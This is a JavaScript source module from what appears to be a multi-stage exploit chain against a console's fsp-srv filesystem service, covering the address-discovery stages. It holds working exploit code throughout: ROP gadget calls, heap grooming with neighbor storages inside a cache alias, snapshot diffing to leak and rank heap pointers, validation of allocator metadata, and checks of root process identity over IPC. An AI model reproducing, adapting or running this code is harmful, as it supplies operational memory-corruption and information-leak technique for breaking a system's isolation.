import coreRuntime, {waitMs} from "../runtime.mjs";

const {
    CachePlan,
    GADGET_MEMSET,
    allocPage,
    call_rop,
    closeHandle,
    hex32,
    ipcStorageGetSize,
    ipcStorageRead,
    openContentStorage,
    read64
} = coreRuntime;

// ----- Address discovery (S15 to S19) -----

/**
 * S15: open and prime the extra storages that later act as release neighbors.
 * They are opened after the alias, so their caches land at higher heap addresses,
 * inside the alias window.
 */
export async function prepareReleaseNeighbors({
    config,
    candidateHandle,
    aliasInstalled,
    copyStepsCompleted,
    rootSession
}) {

    /*
     * This value caps the sampling work, it is not a required handle count. When a
     * later open fails, the handles primed so far are kept, so discovery can still
     * use the partial neighborhood.
     */
    const MAX_EXTRA_NEIGHBORS = 8;
    const eligible = Boolean(candidateHandle &&
        (aliasInstalled || copyStepsCompleted > 0));
    const extraStorages = [];
    let attemptedStorages = 0;
    let failureReason = null;

    if (!eligible) {
        return {ok: true, eligible, extraStorages, attemptedStorages,
            expectedStorages: MAX_EXTRA_NEIGHBORS, failureReason};
    }

    /*
     * Prime each storage with 16 reads, one per 0x4000-byte block, before taking
     * the release snapshots. The storages were opened after the alias, so their
     * caches sit inside its window.
     */
    const PRIME_BLOCKS = 16;
    const extraPrimeBuffer = allocPage(0x1000);

    for (let neighborIndex = 0; neighborIndex < MAX_EXTRA_NEIGHBORS; neighborIndex++) {
        attemptedStorages++;
        const storageHandle = openContentStorage(rootSession);

        if (!storageHandle) {
            failureReason = "storage-open-failed-at-" + (neighborIndex + 1);
            break;
        }

        let primeOk = true;

        for (let blockIndex = 0; blockIndex < PRIME_BLOCKS; blockIndex++) {
            const readResult = ipcStorageRead(storageHandle,
                                              blockIndex * config.CONTROL_SIZE, 16,
                                              extraPrimeBuffer);

            if (readResult.error !== 0) {
                failureReason = "prime-read-failed-at-" + (neighborIndex + 1);
                primeOk = false;
                break;
            }
        }

        if (!primeOk) {
            closeHandle(storageHandle);
            break;
        }

        extraStorages.push(storageHandle);
    }

    return {ok: true, eligible, extraStorages, attemptedStorages,
        expectedStorages: MAX_EXTRA_NEIGHBORS, failureReason};
}

/** S16: capture the initial cache window before any neighbor is closed. */
export async function captureReleaseBaseline({
    config,
    candidateHandle,
    primeHex,
    helpers
}) {
    const previousBuffer = allocPage(config.CACHE_READ_SIZE + 0x2000);
    const currentBuffer = allocPage(config.CACHE_READ_SIZE + 0x2000);

    /*
     * Compare the live buffers in place. Copying two MiB per release round would
     * add millions of read8 calls to a sweep that is already qualified.
     */
    call_rop(GADGET_MEMSET, previousBuffer, 0xA5n,
             BigInt(config.CACHE_READ_SIZE));
    const read0 = ipcStorageRead(candidateHandle, config.ALIAS_OFFSET,
                                 config.CACHE_READ_SIZE, previousBuffer);

    let prevEnd = 0;
    let prefix0Ok = false;
    let snapshotOk = false;

    if (read0.error === 0) {
        const prefix0 = helpers.readHexBytes(previousBuffer, 16);
        prefix0Ok = prefix0 === primeHex;

        prevEnd = config.CACHE_READ_SIZE;
        const last0 = helpers.readHexBytes(previousBuffer + BigInt(config.CACHE_READ_SIZE - 16), 16);

        if (last0 === "a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5") {
            let low = config.CONTROL_SIZE;
            let high = config.CACHE_READ_SIZE;

            while (low < high) {
                const middle = ((low + high) >>> 1) & ~7;

                if (read64(previousBuffer + BigInt(middle)) ===
                    0xA5A5A5A5A5A5A5A5n) {
                    high = middle;
                } else {
                    low = middle + 8;
                }
            }
            prevEnd = low;
        }

        // Skip the first cache block, then require one full block after it.
        const minimumScanSpan = config.CONTROL_SIZE * 2;
        snapshotOk = prefix0Ok && prevEnd >= minimumScanSpan;
    }

    return {ok: true, previousBuffer, currentBuffer, prevEnd, snapshotOk,
        readError: read0.error, prefixMatches: prefix0Ok};
}

/** S17: close the neighbors one by one, and rank the pointers each release reveals. */
export async function releaseNeighborsAndFindPointers({
    config,
    candidateHandle,
    primeHex,
    extraStorages,
    baseline,
    helpers
}) {

    /*
     * Closing one neighbor at a time keeps its cache effect isolated between two
     * snapshots. The original worker handles stay open for the later waves.
     */
    const extraStorageHandles = extraStorages.slice();
    const pointerCandidates = [];
    let releaseRounds = 0;
    let totalChangedLinks = 0;
    let stopReason;

    if (!baseline.snapshotOk) {
        stopReason = "baseline-not-qualified";
    } else if (extraStorageHandles.length === 0) {
        stopReason = "no-neighbors";
    } else {
        stopReason = null;
    }

    let readError = null;
    let prevEnd = baseline.prevEnd;
    const snapshotOk = baseline.snapshotOk;
    let bufPrev = baseline.previousBuffer;
    let bufCur = baseline.currentBuffer;

    if (snapshotOk) {
        const neighbors = [];

        for (let extraIndex = 0; extraIndex < extraStorageHandles.length; extraIndex++) {
            neighbors.push({name: "extra" + extraIndex,
                handle: extraStorageHandles[extraIndex]});
        }

        for (let releaseIndex = 0; releaseIndex < neighbors.length && snapshotOk; releaseIndex++) {
            const neighbor = neighbors[releaseIndex];
            closeHandle(neighbor.handle);

            if (neighbor.name.indexOf("extra") === 0) {
                const extraStorageIndex = parseInt(neighbor.name.slice(5));
                extraStorageHandles[extraStorageIndex] = 0;
            }

            call_rop(GADGET_MEMSET, bufCur, 0xA5n,
                     BigInt(config.CACHE_READ_SIZE));
            const readN = ipcStorageRead(candidateHandle, config.ALIAS_OFFSET,
                                         config.CACHE_READ_SIZE, bufCur);

            if (readN.error !== 0) {
                stopReason = "snapshot-read-failed";
                readError = readN.error;
                break;
            }

            const scan = scanSnapshotChanges(bufPrev, bufCur, prevEnd, config,
                                             primeHex, helpers,
                                             {round: releaseIndex + 1, name: neighbor.name});

            for (let candidateIndex = 0; candidateIndex < scan.candidates.length; candidateIndex++) {
                pointerCandidates.push(scan.candidates[candidateIndex]);
            }

            totalChangedLinks += scan.clCount;
            releaseRounds++;

            const tmp = bufPrev;
            bufPrev = bufCur;
            bufCur = tmp;
            prevEnd = scan.curEnd;
        }
    }

    let monitoringRounds = 0;

    if (snapshotOk && pointerCandidates.length === 0 &&
        config.MONITORING_ROUNDS > 0 && releaseRounds > 0) {
        for (let monitorIndex = 0;
            monitorIndex < config.MONITORING_ROUNDS && snapshotOk;
            monitorIndex++) {
            await waitMs(10);

            call_rop(GADGET_MEMSET, bufCur, 0xA5n,
                     BigInt(config.CACHE_READ_SIZE));
            const readM = ipcStorageRead(candidateHandle, config.ALIAS_OFFSET,
                                         config.CACHE_READ_SIZE, bufCur);

            if (readM.error !== 0) {
                stopReason = "monitor-snapshot-read-failed";
                readError = readM.error;
                break;
            }

            const mscan = scanSnapshotChanges(bufPrev, bufCur, prevEnd, config,
                                              primeHex, helpers,
                                              {round: releaseRounds + monitorIndex + 1,
                                                  name: "monitor" + monitorIndex});

            for (let candidateIndex = 0;
                candidateIndex < mscan.candidates.length;
                candidateIndex++) {
                pointerCandidates.push(mscan.candidates[candidateIndex]);
            }

            totalChangedLinks += mscan.clCount;
            monitoringRounds++;

            const mtmp = bufPrev;
            bufPrev = bufCur;
            bufCur = mtmp;
            prevEnd = mscan.curEnd;

            if (pointerCandidates.length > 0) {
                break;
            }
        }
    }

    pointerCandidates.sort(function(a, b) {
        if (b.strength !== a.strength) {
            return b.strength - a.strength;
        }

        if (a.target < b.target) {
            return -1;
        } else if (a.target > b.target) {
            return 1;
        }

        return a.offset - b.offset;
    });
    return {ok: true, extraStorages: extraStorageHandles, pointerCandidates,
        releaseRounds, monitoringRounds, totalChangedLinks, stopReason,
        readError};
}

/**
 * S18 and S19: read the candidate back, qualify one address plan, then prove the
 * root identity by reading it. Nothing here writes to the target.
 *
 * The stages run in a fixed order because each one narrows the next: ranked
 * pointers, a plan per candidate, the alias recheck, the bucket period, the
 * address reads, the metadata pages, and last the root identity.
 */
export async function qualifyAddressPlan({
    config,
    helpers,
    addressCopy,
    aliasInstalled,
    candidateHandle,
    collectTimingProfile = false,
    reportProgress = null,
    shouldStop = null,
    pointerCandidates,
    primeHex,
    rootSession,
    savedHandle,
    storageHandle,
}) {
    let addressPlan = null;
    let addressReadVerified = false;
    let metadataAnchorChecks = 0;
    let metadataPageChecks = 0;
    let metadataPageProbes = 0;
    let rootCandidateScans = 0;
    let rootPidRead = false;
    let verifiedIdentityTargets = null;
    let domainSession = null;
    let rootCandidateRetryable = false;
    let rootStageVerified = false;
    let selectedAddressCandidate = null;
    let addressFailureReason = null;
    let addressFailureDetail = null;
    let changedLinkCandidates = 0;
    let validAddressPlans = 0;
    let addressAliasRequalified = null;
    let bucketPeriodQualified = null;
    let storageSizeError = null;
    const timingProfile = collectTimingProfile ? Object.create(null) : null;
    let addressCandidatesTested = 0;

    if (!candidateHandle) {
        addressFailureReason = "candidate-storage-unavailable";
    } else if (!aliasInstalled) {
        addressFailureReason = "cache-alias-not-installed";
    } else if (!pointerCandidates.length) {
        addressFailureReason = "no-pointer-candidates";
    }

    if (candidateHandle && aliasInstalled && pointerCandidates.length > 0) {
        let knownPointers = [];
        const knownTargetSet = {};

        for (let pointerIndex = 0; pointerIndex < pointerCandidates.length; pointerIndex++) {
            const pointerItem = pointerCandidates[pointerIndex];

            if (pointerItem.strength !== 3 || !pointerItem.changedLink) {
                continue;
            }

            const targetKey = pointerItem.target.toString();

            if (knownTargetSet[targetKey]) {
                continue;
            }

            knownTargetSet[targetKey] = true;
            knownPointers.push(pointerItem);
        }

        /*
         * Strongest evidence first, ties broken by target address. A ranked
         * pointer stays a candidate until its read guards pass.
         */
        knownPointers.sort(function(a, b) {
            if (a.target < b.target) {
                return -1;
            } else if (a.target > b.target) {
                return 1;
            }

            return a.offset - b.offset;
        });
        changedLinkCandidates = knownPointers.length;

        if (knownPointers.length > config.MAX_ADDRESS_CANDIDATES) {
            knownPointers = knownPointers.slice(0, config.MAX_ADDRESS_CANDIDATES);
        }

        if (knownPointers.length === 0) {
            addressFailureReason = "no-strength-3-changed-link-target";
        } else {
            const sizeReply = ipcStorageGetSize(candidateHandle);

            if (sizeReply.error !== 0 || !sizeReply.size ||
                !Number.isSafeInteger(sizeReply.size)) {
                addressFailureReason = "storage-size-unavailable";
                storageSizeError = sizeReply.error;
            } else {
                const candidatePlans = [];
                const allPointerTargets = pointerCandidates.map(function(item) {
                    return Number(item.target);
                });

                for (let pointerIndex = 0; pointerIndex < knownPointers.length; pointerIndex++) {
                    let candidatePlan = null;

                    try {
                        candidatePlan = CachePlan.buildLowerWindowPlan(Number(knownPointers[pointerIndex].target), sizeReply.size,
                                                                       0x28000, allPointerTargets);
                    } catch {
                        continue;
                    }

                    const encodingControl = helpers.checkAddressHeaderEncoding(candidatePlan.bytes, {savedHandle});

                    if (!encodingControl.ok) {
                        continue;
                    }

                    candidatePlans.push({candidate: knownPointers[pointerIndex],
                        plan: candidatePlan});
                }

                validAddressPlans = candidatePlans.length;

                if (!candidatePlans.length) {
                    addressFailureReason = "no-valid-address-plans";
                }

                if (candidatePlans.length > 0) {
                    addressPlan = candidatePlans[0].plan;
                    const aliasRecheckBuf = allocPage(0x1000);
                    const aliasRecheck = ipcStorageRead(candidateHandle,
                                                        config.ALIAS_OFFSET, 16, aliasRecheckBuf);
                    const aliasRequalified = aliasRecheck.error === 0 &&
                        helpers.readHexBytes(aliasRecheckBuf, 16) === primeHex;
                    addressAliasRequalified = aliasRequalified;

                    if (!aliasRequalified) {
                        addressFailureReason = "alias-recheck-failed";
                        addressFailureDetail = "read=" + hex32(aliasRecheck.error);
                        addressPlan = null;
                    }

                    if (addressPlan) {
                        const periodStartedAt = collectTimingProfile ? Date.now() : 0;
                        const periodResult = await helpers.qualifyCacheBucketPeriod({
                            candidateHandle, primeHex, storageHandle, addressCopy,
                            shouldStop
                        });

                        addTimingDuration(timingProfile, "period", periodStartedAt);

                        addressCopy = periodResult.addressCopy;
                        bucketPeriodQualified = periodResult.ok;

                        if (!bucketPeriodQualified) {
                            addressFailureReason = "cache-bucket-period-unqualified";
                            addressPlan = null;
                        }
                    }

                    /*
                     * A changed pointer only seeds this search. Its allocator
                     * anchors have to validate before a layout is captured, and a
                     * mismatched anchor moves on to the next bounded candidate.
                     */
                    for (let addressCandidateIndex = 0;
                        addressPlan && !shouldStop?.() &&
                            addressCandidateIndex < candidatePlans.length;
                        addressCandidateIndex++) {
                        const addressCandidate = candidatePlans[addressCandidateIndex];
                        addressPlan = addressCandidate.plan;
                        addressCandidatesTested++;
                        const addressLabel = "candidate " + (addressCandidateIndex + 1) + "/" +
                            candidatePlans.length;

                        const addressReadStartedAt = collectTimingProfile ? Date.now() : 0;
                        const candidateResult = await helpers.verifyAddressCandidate(addressPlan,
                                                                                     addressLabel,
                                                                                     addressCandidateIndex + 1, {
                                                                                         config, addressPlan,
                                                                                         candidateHandle, storageHandle,
                                                                                         addressCopy, shouldStop
                                                                                     });

                        addTimingDuration(timingProfile, "addressReads", addressReadStartedAt);

                        addressPlan = candidateResult.addressPlan;
                        addressCopy = candidateResult.addressCopy;

                        if (candidateResult.verified) {
                            addressReadVerified = true;
                            selectedAddressCandidate = addressCandidate.candidate;
                            rootCandidateRetryable = false;

                            if (reportProgress) {
                                await reportProgress("ADDRESS_SCAN: Address read passed for " +
                                    "metadata candidate " + (addressCandidateIndex + 1) + "/" +
                                    candidatePlans.length + "; scanning metadata.");
                            }

                            const metadataStartedAt = collectTimingProfile ? Date.now() : 0;
                            const metadataDiscovery =
                                await helpers.discoverMetadataAnchors(addressPlan,
                                                                      addressLabel, {config, addressPlan,
                                                                          candidateHandle, metadataAnchorChecks,
                                                                          reportProgress});

                            addTimingDuration(timingProfile, "metadata", metadataStartedAt);

                            addressPlan = metadataDiscovery.addressPlan;
                            metadataAnchorChecks = metadataDiscovery.metadataAnchorChecks;
                            const discoveredAnchorCount =
                                metadataDiscovery.anchors?.length || 0;

                            if (reportProgress) {
                                await reportProgress("ADDRESS_SCAN: Metadata candidate " +
                                    (addressCandidateIndex + 1) + "/" + candidatePlans.length + ": " +
                                    discoveredAnchorCount + " anchor(s) from " +
                                    (metadataDiscovery.externalLinkChecks || 0) + " link checks.");
                            }

                            if (!metadataDiscovery.ok) {
                                addressFailureReason = "metadata-anchor-discovery-failed";
                                addressFailureDetail = metadataDiscovery.error || "unknown";

                                if (metadataDiscovery.continueSeed &&
                                    addressCandidateIndex + 1 < candidatePlans.length) {
                                    continue;
                                }

                                break;
                            }

                            const tryNextSeed = metadataDiscovery.anchors.length === 0 &&
                                metadataDiscovery.continueSeed;

                            if (metadataDiscovery.anchors.length === 0) {
                                addressFailureReason = "no-metadata-anchors";
                                addressFailureDetail = "poolHypotheses=" +
                                    (metadataDiscovery.poolCandidates || 0) + "; externalLinkChecks=" +
                                    (metadataDiscovery.externalLinkChecks || 0);
                            }

                            let stopSeedScan = false;
                            let rootScansForSeed = 0;
                            const pageProbesBeforeSeed = metadataPageProbes;

                            for (let metadataAnchorIndex = 0; !shouldStop?.() &&
                                metadataAnchorIndex < metadataDiscovery.anchors.length &&
                                    rootCandidateScans < config.MAX_ROOT_LAYOUT_SCANS &&
                                    metadataPageProbes < config.MAX_METADATA_PAGE_PROBES;
                                metadataAnchorIndex++) {
                                const metadataAnchor = metadataDiscovery.anchors[metadataAnchorIndex];
                                metadataPageProbes++;
                                const pageStartedAt = collectTimingProfile ? Date.now() : 0;
                                const metadataPageResult = await helpers.qualifyMetadataPage(metadataAnchor,
                                                                                             addressLabel + " page " +
                                                                                                  (metadataAnchorIndex + 1) + "/" +
                                                                                                  metadataDiscovery.anchors.length,
                                                                                             allPointerTargets, {
                                                                                                 config, addressPlan,
                                                                                                 metadataPageProbes,
                                                                                                 storageHandle, candidateHandle,
                                                                                                 savedHandle, addressCopy,
                                                                                                 shouldStop
                                                                                             });

                                addTimingDuration(timingProfile, "pages", pageStartedAt);

                                addressPlan = metadataPageResult.addressPlan;
                                addressCopy = metadataPageResult.addressCopy;

                                if (!metadataPageResult.ok) {
                                    addressFailureReason = "metadata-page-guard-failed";
                                    addressFailureDetail = metadataPageResult.error ||
                                        "reciprocal-link or page guard rejected";

                                    if (metadataPageResult.continueScan) {
                                        continue;
                                    }

                                    stopSeedScan = true;
                                    break;
                                }

                                metadataPageChecks++;
                                rootCandidateRetryable = false;
                                rootCandidateScans++;
                                rootScansForSeed++;

                                if (reportProgress) {
                                    await reportProgress("ADDRESS_SCAN: Metadata page passed; checking FSP root identity.");
                                }

                                const rootStartedAt = collectTimingProfile ? Date.now() : 0;
                                try {
                                    const identityResult =
                                        await helpers.inspectFspIdentityTargetsReadOnly({
                                            config, addressPlan, candidateHandle,
                                            domainSession, rootCandidateRetryable,
                                            rootPidRead, rootSession,
                                            verifiedIdentityTargets,
                                            reportProgress
                                        });
                                    rootStageVerified = identityResult.ok;
                                    domainSession = identityResult.domainSession;
                                    rootCandidateRetryable = identityResult.rootCandidateRetryable;
                                    rootPidRead = identityResult.rootPidRead;
                                    verifiedIdentityTargets = identityResult.verifiedIdentityTargets;

                                    if (collectTimingProfile && identityResult.rootTiming) {
                                        const rootTiming = identityResult.rootTiming;
                                        addTimingValue(timingProfile, "rootClear", rootTiming.clearMs);
                                        addTimingValue(timingProfile, "rootRead", rootTiming.readMs);
                                        addTimingValue(timingProfile, "rootScan", rootTiming.scanMs);
                                        addTimingValue(timingProfile, "rootLookup", rootTiming.lookupMs);
                                        addTimingValue(timingProfile, "rootChunksRead", rootTiming.chunksRead);
                                    }
                                } catch (rootError) {
                                    addressFailureReason = "root-inspection-failed";
                                    addressFailureDetail = rootError.message;
                                    rootStageVerified = false;
                                    rootCandidateRetryable = false;
                                } finally {
                                    addTimingDuration(timingProfile, "root", rootStartedAt);
                                }

                                if (rootStageVerified) {
                                    break;
                                }

                                if (rootCandidateRetryable) {
                                    continue;
                                }

                                stopSeedScan = true;
                                break;
                            }

                            if (!rootStageVerified && reportProgress &&
                                discoveredAnchorCount > 0) {
                                const pageProbesForSeed =
                                    metadataPageProbes - pageProbesBeforeSeed;

                                if (pageProbesForSeed > 0) {
                                    await reportProgress("ADDRESS_SCAN: Metadata page checks passed " + rootScansForSeed + "/" +
                                        pageProbesForSeed + " probes.");
                                } else {
                                    let limit = "metadata page probe limit";

                                    if (rootCandidateScans >= config.MAX_ROOT_LAYOUT_SCANS) {
                                        limit = "FSP root scan limit";
                                    }

                                    await reportProgress("ADDRESS_SCAN: Metadata page checks stopped at the " + limit + ".");
                                }
                            }

                            const seedVerdict = decideSeedVerdict({
                                addressCandidateIndex,
                                candidatePlans,
                                config,
                                metadataDiscovery,
                                metadataPageProbes,
                                rootCandidateRetryable,
                                rootCandidateScans,
                                rootScansForSeed,
                                rootStageVerified,
                                stopSeedScan,
                                tryNextSeed
                            });

                            if (seedVerdict === "continue") {
                                continue;
                            }

                            break;
                        }

                        if (!candidateResult.continueScan) {
                            addressFailureReason = "address-candidate-read-or-copy-failed";
                            break;
                        }

                        if (!candidateResult.verified) {
                            addressFailureReason = "address-read-guards-rejected-candidates";
                        }
                    }

                }
            }
        }
    } else {
        if (!addressFailureReason) {
            addressFailureReason = "address-plan-preconditions-not-met";
        }
    }

    /*
     * S19 runs inside the candidate loop above. This payload reads and compares
     * addresses through the candidate IStorage path, so every fsp-srv, domain and
     * clone IPC stays on the console.
     */
    if (!addressReadVerified) {
        if (!addressFailureReason) {
            addressFailureReason = "address-read-not-qualified";
        }
    } else if (!rootStageVerified) {
        addressFailureReason = "root-identity-not-verified";

        if (!addressFailureDetail && rootCandidateRetryable) {
            addressFailureDetail = "more-candidates-may-qualify";
        } else if (!addressFailureDetail && rootPidRead) {
            addressFailureDetail = "root-PID-read-but-identity-guards-rejected";
        }
    } else {
        addressFailureReason = null;
        addressFailureDetail = null;
    }

    return {ok: true, addressCopy, addressPlan, addressReadVerified,
        addressCandidatesTested, changedLinkCandidates, validAddressPlans,
        addressAliasRequalified, bucketPeriodQualified, storageSizeError,
        addressFailureReason, addressFailureDetail,
        metadataAnchorChecks, metadataPageChecks,
        metadataPageProbes, rootCandidateRetryable, rootCandidateScans,
        rootPidRead, rootStageVerified, selectedAddressCandidate, domainSession,
        verifiedIdentityTargets, timingProfile};
}

/** Add one phase duration to the timing profile, when collection is on. */
function addTimingDuration(timingProfile, key, startedAt) {
    if (!timingProfile) {
        return;
    }

    timingProfile[key] = (timingProfile[key] || 0) + Date.now() - startedAt;
}

/** Add a count the identity helper has already measured. */
function addTimingValue(timingProfile, key, value) {
    if (!timingProfile) {
        return;
    }

    timingProfile[key] = (timingProfile[key] || 0) + value;
}

/**
 * Decide what the seed loop does once a candidate finishes: try another seed, or
 * stop. The caps come first because they are absolute. The retry reasons follow,
 * because they only re-arm while candidates remain.
 */
function decideSeedVerdict({
    addressCandidateIndex,
    candidatePlans,
    config,
    metadataDiscovery,
    metadataPageProbes,
    rootCandidateRetryable,
    rootCandidateScans,
    rootScansForSeed,
    rootStageVerified,
    stopSeedScan,
    tryNextSeed
}) {
    const nextCandidateExists = addressCandidateIndex + 1 < candidatePlans.length;

    if (rootStageVerified) {
        return "stop";
    }

    if (rootCandidateScans >= config.MAX_ROOT_LAYOUT_SCANS) {
        return "stop";
    }

    if (metadataPageProbes >= config.MAX_METADATA_PAGE_PROBES) {
        return "stop";
    }

    if (metadataDiscovery.capReached) {
        return "stop";
    }

    if (metadataDiscovery.stopAfterAnchors) {
        return "stop";
    }

    if (rootCandidateRetryable && !stopSeedScan && nextCandidateExists) {
        return "continue";
    }

    if (tryNextSeed && nextCandidateExists) {
        return "continue";
    }

    if (!stopSeedScan && metadataDiscovery.anchors.length > 0 &&
        rootScansForSeed === 0 && nextCandidateExists) {
        return "continue";
    }

    return "stop";
}

/**
 * Rank the cache-block heads that changed, using pointer shape and stable-tail
 * evidence. The pointer scan stops at the shorter valid span of the two snapshots.
 */
function scanSnapshotChanges(bufPrev, bufCur, prevEnd, config, primeHex, helpers, roundInfo) {
    const prefixN = helpers.readHexBytes(bufCur, 16);
    const prefixNOk = prefixN === primeHex;
    let curEnd = config.CACHE_READ_SIZE;
    const lastN = helpers.readHexBytes(bufCur + BigInt(config.CACHE_READ_SIZE - 16), 16);

    if (lastN === "a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5a5") {
        let low = config.CONTROL_SIZE;
        let high = config.CACHE_READ_SIZE;

        while (low < high) {
            const middle = ((low + high) >>> 1) & ~7;

            if (read64(bufCur + BigInt(middle)) ===
                0xA5A5A5A5A5A5A5A5n) {
                high = middle;
            } else {
                low = middle + 8;
            }
        }
        curEnd = low;
    }

    const effectiveEnd = Math.min(prevEnd, curEnd);
    let blockCount = 0;
    let changed = 0;
    let clCount = 0;
    const candidates = [];

    for (let off = config.CONTROL_SIZE;
        off + config.CONTROL_SIZE <= effectiveEnd;
        off += config.CONTROL_SIZE) {
        blockCount++;
        const prevHead = read64(bufPrev + BigInt(off));
        const curHead = read64(bufCur + BigInt(off));

        if (prevHead === curHead) {
            continue;
        }

        changed++;

        let tailMatch = true;

        for (let t = 8; t < config.CONTROL_SIZE; t += 8) {
            if (read64(bufPrev + BigInt(off + t)) !==
                read64(bufCur + BigInt(off + t))) {
                tailMatch = false;
                break;
            }
        }

        if (tailMatch) {
            clCount++;
        }

        const cBig = curHead;
        const isPtr = cBig >= 0x100000000n && cBig < (1n << 39n);
        const isAligned = isPtr && cBig % 0x4000n === 0n;
        const low24ok = isPtr && (cBig & 0xFFFFFFn) !== 0n;

        let zeroTail = false;
        let zeroAfter32 = false;

        if (isPtr && isAligned && low24ok) {
            zeroTail = true;
            for (let zt = 8; zt < 64; zt += 8) {
                if (read64(bufCur + BigInt(off + zt)) !== 0n) {
                    zeroTail = false;
                    break;
                }
            }
            zeroAfter32 = true;
            for (let za = 32; za < config.CONTROL_SIZE; za += 8) {
                if (read64(bufCur + BigInt(off + za)) !== 0n) {
                    zeroAfter32 = false;
                    break;
                }
            }
        }

        let strength = 0;

        if (tailMatch && isPtr && isAligned && low24ok) {
            strength = 3;
        } else if (isPtr && isAligned && low24ok && zeroTail) {
            strength = 2;
        } else if (isPtr && isAligned && low24ok && zeroAfter32) {
            strength = 1;
        }

        if (strength > 0) {
            candidates.push({
                offset: off, target: cBig, round: roundInfo.round,
                previous: prevHead,
                neighbor: roundInfo.name, changedLink: tailMatch,
                zeroTail, zeroAfter32, strength
            });
        }
    }

    return {prefixOk: prefixNOk, prefix: prefixN, curEnd, blockCount,
        changed, clCount, candidates};
}
